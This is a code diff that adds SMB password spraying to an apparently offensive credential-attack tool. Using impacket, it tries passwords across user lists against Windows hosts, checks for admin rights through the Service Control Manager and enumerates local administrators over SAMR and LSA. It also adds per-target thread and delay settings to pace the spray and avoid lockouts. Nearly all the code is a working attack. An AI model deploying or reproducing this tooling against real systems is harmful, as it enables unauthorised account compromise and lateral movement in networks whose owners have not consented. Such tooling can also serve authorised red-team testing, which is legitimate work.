@@ -27,6 +27,71 @@ from selenium.webdriver.chrome.options import Options
 
 from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 
+#SMB stuff
+
+from impacket.smbconnection import SMBConnection, SessionError
+from impacket.dcerpc.v5.transport import DCERPCTransportFactory, SMBTransport
+from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.dcerpc.v5 import scmr
+from impacket.dcerpc.v5 import transport, srvs, wkst
+from impacket import smb
+import ipaddress
+import socket
+
+#SMB local Admin stuff
+from impacket.dcerpc.v5 import transport, lsat, samr, lsad
+from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
+
+
+class EnumLocalAdmins:
+    def __init__(self, smbConnection):
+        self.__smbConnection = smbConnection
+        self.__samrBinding = r'ncacn_np:445[\pipe\samr]'
+        self.__lsaBinding = r'ncacn_np:445[\pipe\lsarpc]'
+
+    def __getDceBinding(self, strBinding):
+        rpc = transport.DCERPCTransportFactory(strBinding)
+        rpc.set_smb_connection(self.__smbConnection)
+        return rpc.get_dce_rpc()
+
+    def getLocalAdmins(self):
+        adminSids = self.__getLocalAdminSids()
+        adminNames = self.__resolveSids(adminSids)
+        return adminSids, adminNames
+
+    def __getLocalAdminSids(self):
+        dce = self.__getDceBinding(self.__samrBinding)
+        dce.connect()
+        dce.bind(samr.MSRPC_UUID_SAMR)
+        resp = samr.hSamrConnect(dce)
+        serverHandle = resp['ServerHandle']
+
+        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, 'Builtin')
+        resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=resp['DomainId'])
+        domainHandle = resp['DomainHandle']
+        resp = samr.hSamrOpenAlias(dce, domainHandle, desiredAccess=MAXIMUM_ALLOWED, aliasId=544)
+        resp = samr.hSamrGetMembersInAlias(dce, resp['AliasHandle'])
+        memberSids = []
+        for member in resp['Members']['Sids']:
+            memberSids.append(member['SidPointer'].formatCanonical())
+        dce.disconnect()
+        return memberSids
+
+    def __resolveSids(self, sids):
+        dce = self.__getDceBinding(self.__lsaBinding)
+        dce.connect()
+        dce.bind(lsat.MSRPC_UUID_LSAT)
+        resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
+        policyHandle = resp['PolicyHandle']
+        resp = lsat.hLsarLookupSids(dce, policyHandle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
+        names = []
+        for n, item in enumerate(resp['TranslatedNames']['Names']):
+            names.append("{}\\{}".format(resp['ReferencedDomains']['Domains'][item['DomainIndex']]['Name'], item['Name']))
+        dce.disconnect()
+        return names
+
+#Smb stuff end
+
 #ChromeDriverManager().install()
 
 #path = os.getcwd()
@@ -62,8 +127,12 @@ consumer = Thread(target=consume)
 consumer.setDaemon(True)
 consumer.start()
 
-ip = get('https://api.ipify.org').text
-print('My public IP address is: {}'.format(ip))
+ip = "0.0.0.0"
+try:
+    ip = get('https://api.ipify.org').text
+    print('My public IP address is: {}'.format(ip))
+except Exception as x:
+    print ("Failed to connect external service for fetching ip, using default")
 
 def basic_err_cde_login(uname,taskname, url, password, success_code, threadDelay):
 
@@ -189,6 +258,105 @@ def headless_login(uname,taskname, url, password, threadDelay, login_select,pass
     time.sleep(int(threadDelay))
     #sleep for the delay time and then die
 
+#SMB Stuff mostly taken from https://github.com/absolomb/smbspray
+# smb errors list - stolen from CME
+smb_error_status = [
+    "STATUS_ACCOUNT_DISABLED",
+    "STATUS_ACCOUNT_EXPIRED",
+    "STATUS_ACCOUNT_RESTRICTION",
+    "STATUS_INVALID_LOGON_HOURS",
+    "STATUS_INVALID_WORKSTATION",
+    "STATUS_LOGON_TYPE_NOT_GRANTED",
+    "STATUS_PASSWORD_EXPIRED",
+    "STATUS_PASSWORD_MUST_CHANGE",
+    "STATUS_ACCESS_DENIED"
+]
+
+# taken from CME
+def check_if_admin(conn):
+        rpctransport = SMBTransport(conn.getRemoteHost(), 445, r'\svcctl', smb_connection=conn)
+        dce = rpctransport.get_dce_rpc()
+        try:
+            dce.connect()
+        except:
+            pass
+        else:
+            dce.bind(scmr.MSRPC_UUID_SCMR)
+            try:
+                # 0xF003F - SC_MANAGER_ALL_ACCESS
+                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
+                ans = scmr.hROpenSCManagerW(dce,'{}\x00'.format(conn.getRemoteHost()),'ServicesActive\x00', 0xF003F)
+                return True
+            except scmr.DCERPCException as e:
+                #print("SAMR access issue in check if admin")
+                return False
+                pass
+        return
+
+smb_error_locked = "STATUS_ACCOUNT_LOCKED_OUT"
+
+# function to check if a string is an IP address
+def is_ipv4(string):
+    try:
+        ipaddress.IPv4Network(string)
+        return True
+    except ValueError:
+        return False
+    
+def smb_login(uname,taskname, host, domain, password, threadDelay):
+        try:
+            smbclient = SMBConnection(host, host, sess_port=445)
+            if domain:
+                conn = smbclient.login(uname, password, domain)
+            # if domain isn't supplied get it from the server    
+            else:
+                conn = smbclient.login(uname, password, domain)
+                domain = smbclient.getServerDNSDomainName()
+
+            if conn:
+                hostname = smbclient.getServerDNSHostName()
+                is_admin = False
+                #Admin stuff       
+                is_admin = check_if_admin(smbclient)
+                #Admin Stuff end
+                
+                if not is_ipv4(host):
+                    tip = socket.gethostbyname(host)
+                else:
+                    tip = host
+                if is_admin:
+                    message = "Admin access gained"
+
+                else:
+                    message = "Access gained"
+
+            smbclient.close()    
+        except SessionError as e:
+            error, desc = e.getErrorString()
+            hostname = smbclient.getServerDNSHostName()
+            if not is_ipv4(host):
+                tip = socket.gethostbyname(host)
+            else:
+                tip = host
+            if not domain:
+                domain = smbclient.getServerDNSDomainName()
+            
+            if error in smb_error_status:
+                message = "Error Failed"
+            elif error == smb_error_locked:
+                message = "Account Locked"
+                print(message)
+            else:
+                message = error
+            smbclient.close()
+        
+        row = taskname + "," + tip + "," + domain + "\\" + uname + "," + password + "," + message + "," + format(ip) + ","+ str(datetime.datetime.now())
+        queue.put(row)
+        time.sleep(int(threadDelay))
+        #sleep for the delay time and then die
+
+
+#SMB stuff end
 
 
 def main():
@@ -202,11 +370,11 @@ def main():
     config = configparser.ConfigParser()
     config.read(args.config)
     try:
-        userDelay = config['DEFAULT']['UserDelay']
-        passDelay = config['DEFAULT']['UserDelay']
+        defuserDelay = config['DEFAULT']['UserDelay']
+        defpassDelay = config['DEFAULT']['passDelay']
         defuserList = config['DEFAULT']['userList']
         defpassList = config['DEFAULT']['userList']
-        numThreads = config['DEFAULT']['Threads']
+        defnumThreads = config['DEFAULT']['Threads']
     except Exception as e:
         print("Failed to load defaults from config!! Exiting!!!")
         exit()
@@ -220,11 +388,22 @@ def main():
             userList = config[section]["userList"]
         else:
             userList = defuserList
-
         if config[section]["passList"] != "":
             passList = config[section]["passList"]
         else:
             passList = defpassList
+        if config[section]["Threads"] != "":
+            numThreads = config[section]["Threads"]
+        else:
+            numThreads = defnumThreads
+        if config[section]["userDelay"] != "":
+            userDelay = config[section]["userDelay"]
+        else:
+            userDelay = defuserDelay
+        if config[section]["passDelay"] != "":
+            passDelay = config[section]["passDelay"]
+        else:
+            passDelay = defpassDelay
 
         try:
             url = config[section]["URL"]
@@ -261,6 +440,30 @@ def main():
                     do_login_args = partial(ntlm_login, taskname=taskName, url=url, domain=domain, password=password,threadDelay=userDelay)
 
                     print ("[*] Starting NTLM based password spray against %s with %s users using the password %s !" % (url, unum, password))
+
+                    # https://stackoverflow.com/questions/2846653/how-can-i-use-threading-in-python
+                    pool = ThreadPool(int(numThreads))
+                    results = pool.map(do_login_args, users)
+                    time.sleep(int(passDelay))
+
+                print ("[*] Activity End Time : " + str(datetime.datetime.now()))
+
+            elif type == "smb":
+
+                try:
+                    domain = config[section]["Domain"]
+                except Exception as e:
+                    domain = ""
+                print ("[*] Activity Start Time : " + str(datetime.datetime.now()))
+                # prepare the arguments for do_login function
+                # this list will then be passed to multiprocessing pool
+                # only uname parameter of do_login will change rest remain the same.
+                # partial() will keep the rest of the parameters specified constant
+                for password in passwords:
+
+                    do_login_args = partial(smb_login, taskname=taskName, host=url, domain=domain, password=password,threadDelay=userDelay)
+
+                    print ("[*] Starting SMB based password spray against %s with %s users using the password %s !" % (url, unum, password))
 
                     # https://stackoverflow.com/questions/2846653/how-can-i-use-threading-in-python
                     pool = ThreadPool(int(numThreads))
